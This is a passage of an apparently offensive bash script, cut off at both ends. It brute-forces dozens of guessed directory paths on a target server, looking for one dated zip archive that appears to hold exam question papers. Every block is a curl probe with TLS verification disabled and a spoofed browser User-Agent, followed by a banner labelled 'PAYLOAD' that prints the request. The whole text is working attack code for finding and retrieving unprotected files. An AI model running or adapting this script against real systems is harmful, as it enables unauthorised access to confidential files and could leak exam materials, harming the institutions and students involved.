${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
